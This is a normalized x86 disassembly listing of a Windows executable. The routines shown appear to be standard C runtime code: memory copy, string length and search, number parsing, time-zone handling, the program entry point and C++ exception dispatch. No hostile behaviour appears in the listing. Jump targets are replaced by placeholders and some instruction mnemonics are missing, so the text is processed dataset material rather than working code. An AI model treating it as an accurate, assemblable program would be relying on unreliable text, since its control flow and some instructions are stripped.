mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_409052
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_408f80
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_407f80
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_409167
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_4077f4
push [ esp + 0x4 ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test al 0x1
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4094fc
pop ecx
xor eax eax
retn
test [ esp + 0x8 ] 0x2
je r-xdata
mov [ rw-data ] 0xd
mov [ rw-data ] 0x5
jmp r-xdata
or eax 0xffffffff
retn
sub_407838
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_409563
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_409563
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_4078ce
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_407ea0
cmp eax 0x1
pop ecx
jb r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x1 ] 0x3a
jne r-xdata
and [ ebp + 0xc ] 0x0
cmp [ ebx ] 0x0
mov eax ebx
mov esi 0xff
mov [ ebp + 0x8 ] eax
je r-xdata
and [ eax ] 0x0
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax ]
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
inc ebx
inc ebx
jmp r-xdata
push 0x2
push ebx
push esi
call sub_4099f4
add esp 0xc
and [ esi + 0x2 ] 0x0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
and [ ecx ] 0x0
cmp cl 0x2f
je r-xdata
inc eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
cmp edi ebx
jb r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp + 0xc ] ecx
cmp cl 0x5c
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
sub eax ebx
cmp eax esi
jae r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
test edi edi
je r-xdata
cmp cl 0x2e
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
push esi
push ebx
push edi
call sub_4099f4
add esp 0xc
and [ esi + edi ] 0x0
mov esi eax
mov edi [ ebp + 0x18 ]
test edi edi
je r-xdata
sub edi ebx
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax [ ebp - 0x4 ]
cmp eax esi
jae r-xdata
push edi
push ebx
push [ ebp + 0x14 ]
call sub_4099f4
mov eax [ ebp + 0x14 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
mov ebx [ ebp + 0xc ]
jmp r-xdata
sub edi ebx
cmp edi esi
jb r-xdata
push esi
push [ ebp - 0x4 ]
push edi
call sub_4099f4
add esp 0xc
and [ esi + edi ] 0x0
jmp r-xdata
mov esi eax
push edi
push ebx
push [ ebp + 0x10 ]
call sub_4099f4
mov eax [ ebp + 0x10 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
sub_407a15
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_409a7e
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_409052
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_407a8f
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_40a288
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_407b70
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
inc edx
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
dec eax
je r-xdata
mov cl [ edx ]
inc edx
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
dec eax
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_407c15
push ebx
push esi
mov esi rw-data
push edi
push esi
call sub_40a34a
mov edi eax
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x18 ]
push esi
call sub_409a7e
push esi
push edi
mov ebx eax
call sub_40a3d7
add esp 0x18
mov eax ebx
pop edi
pop esi
pop ebx
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x0
call sub_40ac34
pop ecx
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40aa89
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40a957
mov [ rw-data ] eax
call sub_40a70a
call sub_40a651
call sub_408d3c
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_4069b0
push 0x1c
call sub_407d4a
sub_407cfa
add esp 0xc
mov [ ebp - 0x1c ] eax
push eax
call sub_408d69
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x20 ] ecx
push eax
push ecx
call sub_40a4cd
pop ecx
pop ecx
retn
sub_407d6e
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_40af1a
pop ecx
test eax eax
push esi
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_40af45
pop ecx
pop ecx
pop esi
retn
sub_407db9
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
push [ edi ]
call sub_407ea0
inc eax
push eax
call sub_4075a5
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov [ esi + 0x8 ] 0x1
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_40ba20
pop ecx
pop ecx
sub_407df6
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_407ea0
inc eax
push eax
call sub_4075a5
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_40ba20
pop ecx
pop ecx
jmp r-xdata
sub_407ea0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_407f3b
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_407f80
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_407fe0 ]
jmp [ ecx * 4 + jump_table_40805c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4080c8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4080c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_408260 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_408168 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408260 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4080c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4080c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4080c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_408260 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408260 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408260 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408260 ]
sub_4082b5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_408b52
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408350
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4085fc
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_408350
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_408b52
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_408afc
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4084f7
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4070f8
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40bbf8
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_408b52
push 0x1
push esi
call sub_408a25
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40859f
add esp 0xc
test eax eax
jne r-xdata
call sub_408b52
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4086b0
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_4084f7
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4070f8
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406fcf
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4086b0
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40859f
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40bb10
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_4085fc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_408b52
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_408ab0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4086b0
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_408861
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_406e8f
call sub_406ed1
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_4085fc
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40872b
add esp 0x2c
test eax eax
je r-xdata
sub_40872b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_406f56
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_4087f1
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
